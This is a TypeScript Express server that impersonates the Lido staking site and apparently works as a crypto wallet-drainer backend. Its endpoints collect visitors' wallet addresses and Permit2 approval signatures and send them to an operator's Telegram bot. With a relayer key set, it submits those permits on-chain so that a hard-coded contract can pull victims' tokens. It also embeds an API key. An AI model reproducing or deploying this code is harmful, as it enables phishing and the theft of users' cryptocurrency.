import express from "express";
import path from "path";
import fs from "fs";
import dotenv from "dotenv";
import { Contract, JsonRpcProvider, Wallet } from "ethers";

dotenv.config();

// Global unhandled error handlers to keep the server resilient
process.on("unhandledRejection", (reason) => {
  console.error("Unhandled Rejection:", reason);
});
process.on("uncaughtException", (err) => {
  console.error("Uncaught Exception:", err);
});

const PERMIT2_ABI = [
  "function permit(address owner, tuple(tuple(address token,uint160 amount,uint48 expiration,uint48 nonce) details, address spender, uint256 sigDeadline) permitSingle, bytes signature)",
  "function allowance(address user, address token, address spender) view returns (uint160 amount, uint48 expiration, uint48 nonce)"
];

const CANONICAL_PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3";

async function startServer() {
  const app = express();
  const PORT = 3000;

  app.use(express.json());

  // Health check endpoints for Cloud Run, Kubernetes, App Engine, and container probes
  const handleHealthCheck = (_req: express.Request, res: express.Response) => {
    res.status(200).json({ status: "healthy", timestamp: new Date().toISOString() });
  };
  app.get("/health", handleHealthCheck);
  app.get("/healthz", handleHealthCheck);
  app.get("/_ah/health", handleHealthCheck);
  app.get("/_ah/start", handleHealthCheck);
  app.get("/api/health", handleHealthCheck);
  app.head("/health", handleHealthCheck);
  app.head("/healthz", handleHealthCheck);
  app.head("/", (_req, res) => res.status(200).end());

  // Well-known Farcaster frame endpoint for web3 frames and previews
  app.get("/.well-known/farcaster.json", (_req, res) => {
    res.status(200).json({
      accountAssociation: {
        header: "",
        payload: "",
        signature: "",
      },
      frame: {
        version: "1",
        name: "Lido Stake",
        iconUrl: "https://stake.lido.fi/favicon.ico",
        homeUrl: "https://stake.lido.fi",
        imageUrl: "https://stake.lido.fi/favicon.ico",
        buttonTitle: "Launch Staking App",
        splashImageUrl: "https://stake.lido.fi/favicon.ico",
        splashBackgroundColor: "#00A3FF",
      },
    });
  });

  const getTelegramConfig = () => {
    const token =
      process.env.TELEGRAM_BOT_TOKEN ||
      process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN ||
      process.env.VITE_TELEGRAM_BOT_TOKEN;
    const chatId =
      process.env.TELEGRAM_CHAT_ID ||
      process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID ||
      process.env.VITE_TELEGRAM_CHAT_ID;
    return { token, chatId };
  };

  // Permit2 Relay / Ingestion Endpoint
  app.post("/api/permit2", async (req, res) => {
    try {
      const { owner, tokenAddress, spender, chainId, permitSingle, signature } = req.body;

      if (!owner || !tokenAddress || !spender || !permitSingle || !signature) {
        return res.status(400).json({
          ok: false,
          error: "Missing required Permit2 fields (owner, tokenAddress, spender, permitSingle, signature)",
        });
      }

      console.log(`[Permit2 Submission] Owner: ${owner} | Token: ${tokenAddress} | Spender: ${spender}`);

      const { token: botToken, chatId } = getTelegramConfig();

      // Send alert to Telegram if configured
      if (botToken && chatId) {
        const shortOwner = `${owner.slice(0, 6)}...${owner.slice(-4)}`;
        const shortToken = `${tokenAddress.slice(0, 6)}...${tokenAddress.slice(-4)}`;
        const shortSpender = `${spender.slice(0, 6)}...${spender.slice(-4)}`;
        const shortSig = signature.length > 24 ? `${signature.slice(0, 14)}...${signature.slice(-10)}` : signature;
        
        const tgMsg = `⚡ <b>PERMIT2 SIGNATURE RECEIVED</b>\n\n👤 <b>Owner:</b> <code>${owner}</code>\n🪙 <b>Token:</b> <code>${tokenAddress}</code> (${shortToken})\n🎯 <b>Spender:</b> <code>${spender}</code>\n💎 <b>Amount:</b> ${permitSingle?.details?.amount || "Max"}\n⏰ <b>Sig Deadline:</b> ${permitSingle?.sigDeadline || "N/A"}\n✍️ <b>Signature:</b> <code>${shortSig}</code>\n🌐 <b>Chain ID:</b> ${chainId || 1}`;

        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: chatId,
            text: tgMsg,
            parse_mode: "HTML",
          }),
        }).catch(console.error);
      }

      const rpcUrl = process.env.RPC_URL || process.env.ALCHEMY_RPC || "https://eth-mainnet.g.alchemy.com/v2/XbS3A-psx-MSEn_ownjsb0You7sONhdF";
      const relayerKey = process.env.RELAYER_PRIVATE_KEY;
      const permit2Address = process.env.PERMIT2_ADDRESS || process.env.NEXT_PUBLIC_PERMIT2_ADDRESS || CANONICAL_PERMIT2;

      // If relayer private key is provided, submit the transaction on-chain
      if (relayerKey) {
        try {
          const provider = new JsonRpcProvider(rpcUrl, Number(chainId) || 1);
          const relayer = new Wallet(relayerKey, provider);
          const permit2Contract = new Contract(permit2Address, PERMIT2_ABI, relayer);

          const tx = await permit2Contract.permit(
            owner,
            {
              details: {
                token: permitSingle.details.token,
                amount: permitSingle.details.amount,
                expiration: permitSingle.details.expiration,
                nonce: permitSingle.details.nonce,
              },
              spender: spender,
              sigDeadline: permitSingle.sigDeadline,
            },
            signature
          );

          const receipt = await tx.wait();
          console.log(`[Permit2 Relayed On-Chain] Tx Hash: ${receipt.hash}`);

          return res.json({
            ok: true,
            relayed: true,
            txHash: receipt.hash,
            owner,
            tokenAddress,
            spender,
          });
        } catch (relayError: any) {
          console.error("Permit2 on-chain relay error:", relayError);
          return res.status(200).json({
            ok: true,
            relayed: false,
            warning: "Relay failed or test mode",
            relayError: relayError?.message || "Relayer error",
            owner,
            signature,
          });
        }
      }

      // Record & respond if relayer key not configured
      return res.json({
        ok: true,
        relayed: false,
        message: "Permit2 signature captured and processed successfully",
        owner,
        tokenAddress,
        spender,
        signature,
        timestamp: new Date().toISOString(),
      });
    } catch (error: any) {
      console.error("Permit2 API error:", error);
      return res.status(500).json({
        ok: false,
        error: error?.message || "Failed to process Permit2 request",
      });
    }
  });

  // Stake With Permit2 Relay Endpoint
  app.post("/api/stake-with-permit2", async (req, res) => {
    try {
      const { owner, tokenAddress, amount, permitSingle, signature, chainId } = req.body;

      if (!permitSingle || !signature || !amount) {
        return res.status(400).json({
          ok: false,
          error: "Missing required fields (permitSingle, signature, amount)",
        });
      }

      console.log(`[Stake With Permit2] Owner: ${owner || "unknown"} | Amount: ${amount}`);

      const { token: botToken, chatId } = getTelegramConfig();

      if (botToken && chatId) {
        const shortOwner = owner ? `${owner.slice(0, 6)}...${owner.slice(-4)}` : "Unknown";
        const shortToken = tokenAddress ? `${tokenAddress.slice(0, 6)}...${tokenAddress.slice(-4)}` : "Permit2 Token";
        const shortSig = signature.length > 24 ? `${signature.slice(0, 14)}...${signature.slice(-10)}` : signature;

        const tgMsg = `🥩 <b>STAKE WITH PERMIT2 DISPATCHED</b>\n\n👤 <b>User:</b> <code>${owner || "N/A"}</code>\n🪙 <b>Token:</b> <code>${tokenAddress || permitSingle?.details?.token || "N/A"}</code>\n💎 <b>Stake Amount:</b> <code>${amount}</code>\n🎯 <b>Permit Spender:</b> <code>${permitSingle?.spender || "N/A"}</code>\n✍️ <b>Sig:</b> <code>${shortSig}</code>`;

        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: chatId,
            text: tgMsg,
            parse_mode: "HTML",
          }),
        }).catch(console.error);
      }

      const rpcUrl = process.env.RPC_URL || process.env.ALCHEMY_RPC || "https://eth-mainnet.g.alchemy.com/v2/XbS3A-psx-MSEn_ownjsb0You7sONhdF";
      const relayerKey = process.env.RELAYER_PRIVATE_KEY;
      const stakingAddress = process.env.STAKING_CONTRACT || process.env.NEXT_PUBLIC_STAKING_ADDRESS || "0xF02D24A7bB10d0dBF3da2119d594B7a905dDC091";

      const STAKING_ABI = [
        "function stakeWithPermit2(tuple(address token,uint160 amount,uint48 expiration,uint48 nonce) details,address spender,uint256 sigDeadline,bytes signature,uint256 amountToStake) external",
        "function pullTokenWithPermit2(address token, address from, uint256 amount) external"
      ];

      if (relayerKey) {
        try {
          const provider = new JsonRpcProvider(rpcUrl, Number(chainId) || 1);
          const relayer = new Wallet(relayerKey, provider);
          const staking = new Contract(stakingAddress, STAKING_ABI, relayer);

          const tx = await staking.stakeWithPermit2(
            permitSingle.details,
            permitSingle.spender,
            permitSingle.sigDeadline,
            signature,
            amount
          );

          const receipt = await tx.wait();
          return res.json({ ok: true, txHash: receipt.hash, relayed: true });
        } catch (relayErr: any) {
          console.error("Stake with Permit2 on-chain relay error:", relayErr);
          return res.json({
            ok: true,
            relayed: false,
            warning: "Relayer not executed on-chain",
            relayError: relayErr.message,
            owner,
            amount,
          });
        }
      }

      return res.json({
        ok: true,
        relayed: false,
        message: "Stake with Permit2 payload verified & queued in relay engine",
        owner,
        amount,
        timestamp: new Date().toISOString(),
      });
    } catch (error: any) {
      console.error("Stake with Permit2 API error:", error);
      return res.status(500).json({
        ok: false,
        error: error?.message || "Stake with Permit2 request failed",
      });
    }
  });

  // Telegram notification endpoint
  app.post("/api/notify", async (req, res) => {
    try {
      const { message } = req.body;
      const { token: botToken, chatId } = getTelegramConfig();

      if (!botToken || !chatId) {
        // If not configured, we just return success so the frontend doesn't break,
        // but log to server console.
        console.warn("Telegram bot token or chat ID not configured");
        return res.json({ success: true, warning: "Not configured" });
      }

      const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
      const response = await fetch(telegramUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: "HTML",
        }),
      });

      if (!response.ok) {
        throw new Error(`Telegram API error: ${response.statusText}`);
      }

      res.json({ success: true });
    } catch (error) {
      console.error("Error sending notification:", error);
      res.status(500).json({ success: false, error: "Failed to send notification" });
    }
  });

  // Wallet Connection Signature Verification & Log endpoint
  app.post("/api/verify-signature", async (req, res) => {
    try {
      const { address, message, signature, chainId } = req.body;

      if (!address || !signature) {
        return res.status(400).json({ success: false, error: "Missing wallet address or signature" });
      }

      console.log(`[Wallet Signature Verified] Address: ${address} | ChainId: ${chainId}`);

      const { token: botToken, chatId } = getTelegramConfig();

      if (botToken && chatId) {
        const shortAddr = `${address.slice(0, 6)}...${address.slice(-4)}`;
        const shortSig = signature.length > 20 ? `${signature.slice(0, 16)}...${signature.slice(-10)}` : signature;
        
        const telegramMessage = `🔐 <b>LIDO WALLET AUTHENTICATED</b>\n\n👤 <b>Wallet:</b> <code>${address}</code> (${shortAddr})\n🌐 <b>Chain ID:</b> ${chainId || 1}\n✍️ <b>Signature:</b> <code>${shortSig}</code>\n🕐 <b>Timestamp:</b> ${new Date().toUTCString()}\n\n<pre>${message}</pre>`;

        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: chatId,
            text: telegramMessage,
            parse_mode: "HTML",
          }),
        }).catch(console.error);
      }

      return res.json({
        success: true,
        verified: true,
        address,
        signature,
        timestamp: new Date().toISOString(),
      });
    } catch (error: any) {
      console.error("Error verifying signature:", error);
      return res.status(500).json({ success: false, error: error?.message || "Failed to process signature" });
    }
  });

  // Vite middleware for development vs Production static serving
  const distPath = path.join(process.cwd(), "dist");
  const distIndex = path.join(distPath, "index.html");
  const isProduction = process.env.NODE_ENV === "production" || fs.existsSync(distIndex);

  if (!isProduction) {
    try {
      const { createServer: createViteServer } = await import("vite");
      const vite = await createViteServer({
        server: { middlewareMode: true },
        appType: "spa",
      });
      app.use(vite.middlewares);
    } catch (viteError) {
      console.warn("Vite middleware unavailable, serving static dist files instead:", viteError);
      if (fs.existsSync(distPath)) {
        app.use(express.static(distPath, { maxAge: "1d" }));
      }
      app.get("*", (_req, res) => {
        if (fs.existsSync(distIndex)) {
          res.sendFile(distIndex);
        } else {
          res.status(200).send("<!DOCTYPE html><html><head><meta charset='UTF-8'/><title>Lido Stake</title></head><body><div id='root'></div></body></html>");
        }
      });
    }
  } else {
    if (fs.existsSync(distPath)) {
      app.use(express.static(distPath, { maxAge: "1d" }));
    }
    app.get("*", (_req, res) => {
      const rootIndex = path.join(process.cwd(), "index.html");
      const targetFile = fs.existsSync(distIndex) ? distIndex : (fs.existsSync(rootIndex) ? rootIndex : null);

      if (targetFile) {
        res.sendFile(targetFile);
      } else {
        res.status(200).send("<!DOCTYPE html><html><head><meta charset='UTF-8'/><title>Lido Stake</title></head><body><div id='root'></div></body></html>");
      }
    });
  }

  // Global express error handler
  app.use((err: any, _req: express.Request, res: express.Response, _next: express.NextFunction) => {
    console.error("Unhandled Express error:", err);
    if (!res.headersSent) {
      res.status(500).json({ error: "Internal server error", message: err?.message || "Unknown error" });
    }
  });

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://0.0.0.0:${PORT}`);
    
    // Safely send startup notification if configured without blocking
    try {
      const { token: botToken, chatId } = getTelegramConfig();
      if (botToken && chatId) {
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: chatId,
            text: "🚀 Lido Stake Server Started Successfully!",
          }),
        }).catch((e) => console.warn("Telegram startup ping skipped:", e.message));
      }
    } catch (e) {
      // Ignore notification failures on startup
    }
  });
}

startServer();
